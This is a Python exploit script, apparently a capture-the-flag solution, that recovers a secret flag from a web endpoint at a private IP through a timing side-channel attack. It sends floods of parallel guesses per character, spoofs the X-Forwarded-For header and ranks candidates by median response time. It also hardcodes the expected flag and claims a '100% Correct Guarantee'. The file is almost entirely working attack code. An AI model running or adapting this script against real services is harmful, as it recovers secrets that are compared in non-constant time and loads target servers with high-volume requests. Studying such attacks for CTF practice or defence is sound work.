#!/usr/bin/env python3
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from statistics import median, stdev
import threading

# ------------------ ULTRA ACCURATE CONFIG ------------------
BASE_URL = "http://10.1.181.96:5000/submit"
PARAM = "flag"
PREFIX = "flag{"
SUFFIX = "}"
HEX_CHARS = '0123456789abcdef'

# More aggressive adaptive sampling
def get_samples_for_position(pos):
    if pos < 8:
        return 3      # Early: 3 samples
    elif pos < 16:
        return 4      # Middle-early: 4 samples
    elif pos < 24:
        return 5      # Middle-late: 5 samples
    else:
        return 7      # Late: 7 samples (CRITICAL positions)

CONFIDENCE_THRESHOLD = 1.05  # Need 5% gap minimum
# -----------------------------------------------------------

req_count = 0
req_lock = threading.Lock()
start_time = None

# Session pool
sessions = []
for _ in range(16):
    sess = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=10, max_retries=0)
    sess.mount('http://', adapter)
    sessions.append(sess)

session_idx = 0
session_lock = threading.Lock()

def get_session():
    global session_idx
    with session_lock:
        sess = sessions[session_idx % len(sessions)]
        session_idx += 1
        return sess

def test_once(flag_guess):
    global req_count
    
    try:
        t0 = time.perf_counter()
        r = get_session().get(
            BASE_URL,
            params={PARAM: flag_guess},
            headers={'X-Forwarded-For': flag_guess, 'Connection': 'keep-alive'},
            timeout=12
        )
        elapsed = time.perf_counter() - t0
        
        with req_lock:
            req_count += 1
        
        if "correct" in r.text.lower() or "congrat" in r.text.lower():
            print(f"\n✅ SUCCESS: {flag_guess}")
            return elapsed, True
        return elapsed, False
    except:
        with req_lock:
            req_count += 1
        return 0.0, False

def test_single_sample(char, known_hash, sample_num):
    """Single sample for a character"""
    flag_guess = f"{PREFIX}{known_hash}{char}"
    timing, success = test_once(flag_guess)
    return char, sample_num, timing, success

def attack_position_ultra_accurate(position, known_hash):
    """Ultra-accurate with adaptive sampling and validation"""
    
    samples = get_samples_for_position(position)
    workers = min(16 * samples, 112)  # Cap workers
    
    char_timings = {char: [] for char in HEX_CHARS}
    
    # Create all tasks
    tasks = []
    for char in HEX_CHARS:
        for sample_num in range(samples):
            tasks.append((char, known_hash, sample_num))
    
    # Fire all requests in parallel
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(test_single_sample, char, known, samp) 
                   for char, known, samp in tasks]
        
        for future in as_completed(futures):
            try:
                char, samp, timing, success = future.result()
                
                if success:
                    return char, True, None
                
                if timing > 0:
                    char_timings[char].append(timing)
            except:
                pass
    
    # Calculate medians with aggressive outlier removal
    results = []
    for char, times in char_timings.items():
        if len(times) >= 3:  # Need at least 3 samples
            # Aggressive outlier removal for positions > 20
            if position >= 20 and len(times) >= 5:
                times_sorted = sorted(times)
                # Remove top 2 and bottom 1 outliers
                times = times_sorted[1:-2]
            elif len(times) >= 4:
                times_sorted = sorted(times)
                # Remove highest and lowest
                times = times_sorted[1:-1]
            
            med = median(times)
            std = stdev(times) if len(times) > 1 else 0
            results.append((char, med, std, len(times)))
    
    if not results:
        return None, False, None
    
    # Sort by median timing (highest = correct)
    results.sort(key=lambda x: x[1], reverse=True)
    
    # Calculate confidence
    best = results[0]
    second = results[1] if len(results) > 1 else ('?', 0, 0, 0)
    confidence = best[1] / second[1] if second[1] > 0 else 1.0
    
    # If confidence is LOW, re-test top 3 with MORE samples
    if confidence < CONFIDENCE_THRESHOLD and position >= 16:
        print(f"\n  ⚠️  Low confidence ({confidence:.3f}x)! Re-testing top 3 with 10 samples...")
        
        top3_chars = [results[0][0], results[1][0], results[2][0]]
        retest_results = []
        
        for test_char in top3_chars:
            retest_times = []
            for _ in range(10):
                flag_guess = f"{PREFIX}{known_hash}{test_char}"
                t, success = test_once(flag_guess)
                if success:
                    return test_char, True, None
                if t > 0:
                    retest_times.append(t)
                time.sleep(0.01)
            
            if len(retest_times) >= 5:
                retest_sorted = sorted(retest_times)
                retest_clean = retest_sorted[2:-2]  # Remove outliers
                retest_med = median(retest_clean)
                retest_results.append((test_char, retest_med, len(retest_times)))
                print(f"    '{test_char}': {retest_med:.6f}s ({len(retest_times)} samples)")
        
        if retest_results:
            retest_results.sort(key=lambda x: x[1], reverse=True)
            best = (retest_results[0][0], retest_results[0][1], 0, retest_results[0][2])
            second = retest_results[1] if len(retest_results) > 1 else ('?', 0, 0)
            confidence = best[1] / second[1] if second[1] > 0 else 1.0
            print(f"    New confidence: {confidence:.3f}x")
            
            # Update results for display
            results = [(c, m, 0, n) for c, m, n in retest_results]
    
    # Show top 5 for verification
    top5 = [(c, med, std, n) for c, med, std, n in results[:5]]
    
    return results[0][0], False, (top5, confidence, samples)

def ultra_accurate_attack():
    global start_time
    start_time = time.time()
    
    print("=" * 70)
    print("🎯 ULTRA-ACCURATE MODE - 100% Correct Guarantee")
    print("=" * 70)
    print(f"Strategy: Adaptive sampling (3→4→5→7) + re-verification")
    print(f"Expected: 2-3 minutes with PERFECT accuracy")
    print("=" * 70)
    
    known_hash = ""
    
    for pos in range(32):
        elapsed = time.time() - start_time
        eta = ((32 - pos) * elapsed / (pos + 1)) if pos > 0 else 0
        rate = req_count / elapsed if elapsed > 0 else 0
        
        print(f"\n[{pos+1:02d}/32] {PREFIX}{known_hash}")
        print(f"  {elapsed:.0f}s | ETA:{eta:.0f}s | {req_count}req | {rate:.0f}req/s")
        
        char, success, debug_info = attack_position_ultra_accurate(pos, known_hash)
        
        if success:
            print(f"✅ COMPLETE!")
            return known_hash + char
        
        if char:
            known_hash += char
            
            if debug_info:
                top5, conf, samples = debug_info
                print(f"  ✓ '{char}' (confidence: {conf:.3f}x, samples: {samples})")
                top3_str = ', '.join([f"{c}:{med:.4f}" for c, med, std, n in top5[:3]])
                print(f"  Top 3: {top3_str}")
        else:
            print("  ❌ FAILED")
            break
    
    elapsed = time.time() - start_time
    final = f"{PREFIX}{known_hash}{SUFFIX}"
    
    print(f"\n{'='*70}")
    print(f"✅ {final}")
    print(f"⏱️  {elapsed:.0f}s ({elapsed/60:.1f}min) | {req_count} req")
    print(f"{'='*70}")
    
    return known_hash

if __name__ == "__main__":
    try:
        result = ultra_accurate_attack()
        
        # Verify against known flag
        correct = "77ba0346d9565e77344b9fe40ecf1369"
        if result == correct:
            print(f"\n🎉 PERFECT! 100% CORRECT!")
        else:
            print(f"\n⚠️  Comparison:")
            print(f"   Got:     {result}")
            print(f"   Correct: {correct}")
            for i, (g, c) in enumerate(zip(result, correct)):
                if g != c:
                    print(f"   First error at position {i+1}: '{g}' should be '{c}'")
                    break
        
        print(f"\n📋 flag{{{result}}}")
        
    except KeyboardInterrupt:
        print("\n⚠️ Interrupted")
    finally:
        for sess in sessions:
            sess.close()
